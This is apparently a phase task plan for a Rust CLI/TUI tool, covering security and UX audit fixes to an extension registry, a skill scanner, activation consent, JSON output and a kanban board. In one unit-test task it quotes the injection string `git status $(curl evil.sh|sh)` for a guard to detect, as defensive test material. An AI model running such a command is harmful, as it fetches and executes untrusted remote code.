---
phase: 32
name: "Command-Surface Audit Closure"
status: Todo
subsystem: "crates/tui crates/cli crates/domain"
requires: []
provides: []
key_files:
  created: []
  modified: []
patterns_established: []
duration_minutes: ~
---

# Stage 32 Tasks — Command-Surface Audit Closure

**Phase:** 32
**Status:** Todo
**Strategic Goal:** Realize `l2-tui` 1.3.0 §4.5 (the command bar's direct-entry key) and close five previously-disclosed-but-unbuilt gaps against already-Stable specs, all surfaced by a real build-and-run audit of the compiled CLI/TUI binary.

## Atomic Checklist

- [ ] [T-32A01] Global `/` key focuses the command bar directly
- [ ] [T-32B01] `ExtensionRegistry` gains a durable store
- [ ] [T-32B02] `ext add` runs the install-time skill scanner
- [ ] [T-32B03] `ext activate` requires an explicit grant
- [ ] [T-32C01] `ToolGuard` shell-metacharacter parity with `SkillScanner`
- [ ] [T-32D01] Remaining `--format json` sites honor the requested format
- [ ] [T-32E01] Board panel's Archive column reads real data
- [ ] [T-32E02] `board_column()` degrades one bad row, not the whole panel
- [ ] [T-32T01] Full-cycle validation

## Detailed Tracking

### [T-32A01] Global `/` key focuses the command bar directly

- **Spec:** l2-tui.md §4.5
- **Status:** Todo
- **Assignment:** Agent
- **Verify:** New unit tests in `crates/tui/src/app.rs`'s test module: (a) `Key::Char('/')` while `focus != CommandBar` sets `view.focus == Focus::CommandBar` and leaves `command_input` empty (the keystroke is consumed by the focus change, not inserted); (b) the same key while `focus == CommandBar` appends a literal `/` to `command_input` instead. `cargo test -p cronus-tui --all-targets` green.
- **Handoff:** None — independent of every other track.
- **Notes:** Add a global `/` arm in `App::handle_key` above the existing `_ if focus == CommandBar` arm, branching on current focus to decide jump-vs-insert. `Tab`/`BackTab`/`Esc` bindings stay exactly as they are.

### [T-32B01] `ExtensionRegistry` gains a durable store

- **Spec:** l2-extension-registry.md §4.4 (storage layout already specified: `<ws>/extensions/plugins/<id>/config.json`), l2-tool-security.md §4.1
- **Status:** Todo
- **Assignment:** Agent
- **Verify:** A new `cli_smoke.rs` test spawning `cronus ext add <manifest>` and `cronus ext list` as two **separate** subprocess invocations (matching this suite's own subprocess-per-call convention) confirms the added extension is visible in the second call. `cargo test -p cronus-cli --all-targets` green.
- **Handoff:** Hard prerequisite for T-32B02 and T-32B03 — both are no-ops against a registry that forgets its own state between invocations, which is exactly this session's own empirical finding (a scan-flagged manifest "registered" cleanly, then vanished from `ext list` immediately after).
- **Notes:** The storage location and format are already specified; this task builds the reader/writer, not the design. Confirm which crate should own it (`crates/domain` vs. a new facade seam in `crates/core`) against the project's existing store-tier conventions before writing, rather than assuming.

### [T-32B02] `ext add` runs the install-time skill scanner

- **Spec:** l2-tool-security.md §4.1, EXT-2
- **Status:** Todo
- **Assignment:** Agent
- **Verify:** A `cli_smoke.rs` test reproducing this session's own empirical repro (a manifest whose content trips `SkillScanner`'s `DoNotInstall` recommendation) confirms `ext add` now exits non-zero and never registers it — checked by a following `ext list` not showing it. A second fixture with only `Safe`/`Caution` findings still registers normally.
- **Handoff:** Depends on T-32B01.
- **Notes:** Call `cronus_core::tool_security::SkillScanner::scan_content` before `registry.register(manifest)` in `crates/cli/src/commands.rs::ext::add`, mirroring the report shape `ext::scan` already prints.

### [T-32B03] `ext activate` requires an explicit grant

- **Spec:** l2-extension-registry.md, EXT-3
- **Status:** Todo
- **Assignment:** Agent
- **Verify:** A `cli_smoke.rs` test mirroring the existing `activation_enable_without_acknowledgement_refuses_when_noninteractive` pattern: a non-interactive `ext activate` (stdin nulled) with no acknowledgment flag exits non-zero, naming the flag that would unblock it; supplying the flag (or a real interactive confirmation) lets activation proceed.
- **Handoff:** Depends on T-32B01.
- **Notes:** Reuse the `activation_cmd::enable_gate`/`confirm_disclosure` pattern already proven in the same crate rather than inventing a second consent mechanism.

### [T-32C01] `ToolGuard` shell-metacharacter parity with `SkillScanner`

- **Spec:** l2-tool-security.md §4.1
- **Status:** Todo
- **Assignment:** Agent
- **Verify:** New unit test in `crates/domain/src/tool_security.rs`: `ToolGuard::default().evaluate("bash", &[("cmd", "git status $(curl evil.sh|sh)")])` now reports a `CommandInjection` finding at `High` severity or above — the identical string `SkillScanner`'s CI-001 rule already flags. `cargo test -p cronus-domain --all-targets` green.
- **Handoff:** None.
- **Notes:** Extend `SHELL_METACHARACTERS` to include `$`, `(`, `)`, and newline.

### [T-32D01] Remaining `--format json` sites honor the requested format

- **Spec:** l2-cli.md §4.2
- **Status:** Todo
- **Assignment:** Agent
- **Verify:** Extend `cli_smoke.rs`'s existing `installation_verbs_emit_valid_json_for_the_json_format` test's argument list to also cover `registry show work`, `registry create`, `registry disable`, `registry enable`, `ext list` (once T-32B01 makes a non-empty listing reachable), and the two flagged `activation`/`ext activate` outcome branches — each line must pass the same `looks_like_json` structural check the existing test already applies.
- **Handoff:** The `ext list` case benefits from T-32B01 landing first but does not block on it (an empty-registry JSON case is already covered).
- **Notes:** Sites are named in `crates/cli/src/commands.rs`'s own "Known residual" comments — fix each at its owning site rather than introducing a shared formatter.

### [T-32E01] Board panel's Archive column reads real data

- **Spec:** l2-tui.md §4.1, l2-kanban-board.md
- **Status:** Todo
- **Assignment:** Agent
- **Verify:** New test in `crates/tui/src/app.rs` registering a fixture archived-cards read alongside `core:board.list` and asserting `dispatch_board`'s resulting `BoardView` includes the archived card under `BoardColumn::Archive`.
- **Handoff:** None.
- **Notes:** Only the mutating `core:board.archive` invocable was confirmed to exist this session — confirm during execution whether a read-side listing verb for already-archived cards exists yet; if not, define the minimal read surface consistent with l2-kanban-board.md's already-specified `<ws>/kanban/archive/` layout rather than inventing a new one.

### [T-32E02] `board_column()` degrades one bad row, not the whole panel

- **Spec:** l2-tui.md §4.1 ("unavailable ≠ empty, never silently drop a row" — applied here one level down, at row granularity)
- **Status:** Todo
- **Assignment:** Agent
- **Verify:** Unit test feeding `dispatch_board` a fixture `core:board.list` result with one card in an unrecognized state alongside one normal card: the normal card still renders and the panel stays `Projection::Available`, rather than the whole board falling to `Unavailable`.
- **Handoff:** None — composes with T-32E01 but does not require it.

### [T-32T01] Full-cycle validation

- **Goal:** Verify Phase 32 as a whole against `l2-tui` 1.3.0 and the five disclosed-gap specs it closes.
- **Method:** `cargo fmt --all -- --check`; `cargo clippy --workspace --all-targets -- -D warnings`; `cargo test --workspace` (PowerShell) green across 2 consecutive runs, no flake. Re-run this session's own empirical repro by hand against the freshly built binary (`ext scan` → `ext add` → `ext list` → `ext activate` over the same manifest that previously slipped through) and confirm the sequence now refuses at `ext add`. `rg` sweep for `unwrap\(\)|panic!\(|\.expect\(` across every phase-touched file, confirming no new production-path hits.
- **Status:** Todo
